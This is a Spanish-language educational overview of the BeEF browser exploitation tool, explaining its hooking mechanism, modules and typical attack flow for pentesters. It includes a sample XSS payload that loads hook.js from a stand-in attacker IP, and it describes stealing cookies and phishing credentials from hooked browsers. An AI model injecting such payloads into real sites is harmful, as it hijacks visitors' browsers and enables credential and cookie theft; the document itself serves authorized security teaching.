# BeEF (Browser Exploitation Framework)

## ¿Qué es BeEF?

BeEF, que significa **Browser Exploitation Framework** (Framework de Explotación de Navegadores), es una potente herramienta de pruebas de penetración enfocada en el navegador web. A diferencia de otros frameworks que se centran en vulnerabilidades de red o de sistema operativo, BeEF se especializa en explotar las debilidades del lado del cliente, utilizando el navegador como cabeza de playa para lanzar ataques.

La premisa de BeEF es que, a medida que la seguridad del perímetro de la red mejora, el navegador web se convierte en el eslabón más débil. BeEF permite a un pentester tomar control de un navegador y usarlo como punto de pivote para evaluar la postura de seguridad del entorno del objetivo.

## ¿Para qué es útil la herramienta?

BeEF es una herramienta fundamental para demostrar el impacto real de las vulnerabilidades del lado del cliente, especialmente el Cross-Site Scripting (XSS). Sus usos principales son:

*   **Explotación de XSS:** Es la herramienta por excelencia para mostrar lo que un atacante puede hacer una vez que ha encontrado una vulnerabilidad XSS en un sitio web. En lugar de simplemente mostrar una alerta emergente (`alert('XSS')`), el pentester puede "enganchar" (hook) el navegador de la víctima.
*   **Ingeniería Social y Phishing:** Permite ejecutar módulos que pueden suplantar la identidad de servicios (como Facebook, LinkedIn, etc.) para robar credenciales, mostrar notificaciones falsas, o redirigir al usuario a sitios maliciosos.
*   **Reconocimiento Interno:** Una vez que un navegador dentro de una red corporativa es enganchado, un atacante puede usar BeEF para escanear la red interna, buscar otros hosts, o identificar el sistema operativo y los plugins del navegador de la víctima.
*   **Ataques al Navegador y Plugins:** Contiene módulos para explotar vulnerabilidades conocidas en versiones antiguas de navegadores o en sus plugins (como Flash, Java, etc.).
*   **Persistencia:** BeEF tiene módulos que intentan mantener el control sobre el navegador de la víctima incluso si este cierra la pestaña o navega a otro sitio.

## ¿Cómo funciona?

El funcionamiento de BeEF se basa en el concepto de "hooking" (enganche).

1.  **El "Hook":** BeEF sirve un archivo JavaScript llamado `hook.js`. El objetivo del atacante es lograr que la víctima, a través de su navegador, ejecute este script. La forma más común de lograrlo es inyectando una etiqueta `<script>` en una página web vulnerable a XSS:
    ```html
    <script src="http://<IP_del_atacante>:3000/hook.js"></script>
    ```

2.  **La Conexión:** Una vez que el navegador de la víctima carga y ejecuta `hook.js`, se establece una conexión de "zombie" desde el navegador de la víctima hacia el servidor de BeEF. El navegador "enganchado" queda bajo el control del atacante.

3.  **El Panel de Control:** El atacante gestiona sus navegadores "zombie" a través de una interfaz web (el panel de control de BeEF). Desde aquí, puede ver información detallada sobre el navegador enganchado (versión, sistema operativo, plugins, IP, etc.) y puede lanzar comandos y módulos contra él.

**El Flujo de un Ataque:**
*   Un pentester inicia BeEF.
*   Encuentra una vulnerabilidad XSS en `sitio-vulnerable.com`.
*   Inyecta el script `hook.js` de BeEF en la página vulnerable.
*   Un usuario legítimo visita `sitio-vulnerable.com`.
*   El navegador del usuario ejecuta el `hook.js` y aparece como un nuevo "zombie online" en el panel de control de BeEF del pentester.
*   El pentester ahora puede ejecutar módulos: tomar una captura de pantalla de la página que la víctima está viendo, robar cookies, redirigir el navegador, etc.

## Consideraciones Adicionales

*   **Escrito en Ruby:** BeEF es una aplicación web escrita en Ruby.
*   **Legalidad y Ética:** BeEF es una herramienta de ataque muy poderosa. Su uso solo es legal y ético en entornos de pruebas de penetración autorizados y con el consentimiento explícito del propietario del sistema. Usarlo para atacar a usuarios sin su permiso es un delito.
*   **No es una herramienta de XSS:** BeEF no encuentra vulnerabilidades XSS. Es lo que se usa *después* de que se ha encontrado una vulnerabilidad XSS para explotarla y demostrar su impacto.
*   **Impacto Visual:** BeEF es extremadamente eficaz para demostrar a los clientes y desarrolladores por qué una "simple" vulnerabilidad XSS es en realidad un riesgo de seguridad crítico.

---
*Nota: La información proporcionada aquí es para fines educativos y de seguridad ética. No uses esta herramienta para actividades maliciosas.*
